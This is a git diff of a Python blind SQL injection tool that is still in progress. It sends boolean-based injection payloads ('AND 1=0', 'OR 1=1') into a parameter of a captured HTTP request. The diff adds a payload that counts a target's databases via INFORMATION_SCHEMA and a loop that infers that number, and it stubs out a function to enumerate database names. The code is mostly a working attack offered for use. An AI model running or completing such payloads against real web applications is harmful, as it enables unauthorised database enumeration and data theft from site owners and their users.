@@ -1,6 +1,5 @@
 import requests
 import sys
-import os
 import copy
 
 from DB import DB
@@ -23,10 +22,19 @@ APOSTROPHE = '\''
 
 # strings and flags for the program
 NOT_DETECTED = "no"
+BOOLEAN_FALSE_RESPONSE_INDEX = 0
+BOOLEAN_TRUE_RESPONSE_INDEX = 1
+
+# constants
+MAX_NUM_OF_DBS_TO_CHECK = 20
 
 # sql queries
-BLIND_BOOLEAN_ALWAYS_FALSE = "\' AND 1=0"
-BLIND_BOOLEAN_ALWAYS_TRUE = "\' OR 1=1"
+# Blind Boolean-based sql injection:
+# check if option exists:
+BLIND_BOOLEAN_ALWAYS_FALSE = "\' AND 1=0%s"
+BLIND_BOOLEAN_ALWAYS_TRUE = "\' OR 1=1%s"
+# check amount of dbs:
+BLIND_BOOLEAN_COUNT_DBS = "\' or (SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME) = %s%s"
 
 # flags for operating the program
 READ_REQUEST_FILE_FLAG = '-r'
@@ -142,9 +150,9 @@ def check_if_boolean_based_is_possible(request, parameter, comment):
     :param comment: the comment chars
     :return: a tuple of the reponses in case of false and true queries, and NOT_DETECTED if they are identical
     """
-    request.set_parameter(parameter, BLIND_BOOLEAN_ALWAYS_FALSE+comment)
+    request.set_parameter(parameter, BLIND_BOOLEAN_ALWAYS_FALSE % comment)
     boolean_false = send_request(request)
-    request.set_parameter(parameter, BLIND_BOOLEAN_ALWAYS_TRUE + comment)
+    request.set_parameter(parameter, BLIND_BOOLEAN_ALWAYS_TRUE % comment)
     boolean_true = send_request(request)
     if boolean_true.text != boolean_false.text:
         print(BOOLEAN_BSQLI_ENABLED)
@@ -152,6 +160,34 @@ def check_if_boolean_based_is_possible(request, parameter, comment):
     print(BOOLEAN_BSQLI_DISABLED)
     return NOT_DETECTED
 
+def find_number_of_dbs(request, parameter, comment, true_and_false_requests):
+    """
+
+    :param request:
+    :param parameter:
+    :param comment:
+    :param true_and_false_requests:
+    :return:
+    """
+    for number_of_dbs in range(MAX_NUM_OF_DBS_TO_CHECK):
+        request.set_parameter(parameter, BLIND_BOOLEAN_COUNT_DBS % (str(number_of_dbs), comment))
+        response = send_request(request)
+        if response.text != true_and_false_requests[BOOLEAN_FALSE_RESPONSE_INDEX].text:
+            return number_of_dbs
+    return NOT_DETECTED
+
+
+
+def find_db_names(request, parameter, comment, true_and_false_requests):
+    """
+
+    :param request:
+    :param parameter:
+    :param comment:
+    :param true_and_false_requests:
+    :return:
+    """
+    num_of_dbs = find_number_of_dbs(request, parameter, comment, true_and_false_requests)
 
 if __name__ == '__main__':
     origin_request = parse_request_file("C:\\Users\\Amit\\Downloads\\request.txt")
@@ -163,7 +199,8 @@ if __name__ == '__main__':
     comment = find_comment_sign(request, parameter)
     if comment == NOT_DETECTED:
         exit(0)
-    is_boolean_possible = check_if_boolean_based_is_possible(request, parameter, comment)
-    #if is_boolean_possible != NOT_DETECTED: # boolean is possible!
-     
+    true_and_false_requests = check_if_boolean_based_is_possible(request, parameter, comment)
+    if true_and_false_requests != NOT_DETECTED: # boolean is possible!
+        find_db_names(request, parameter, comment, true_and_false_requests)
+
 
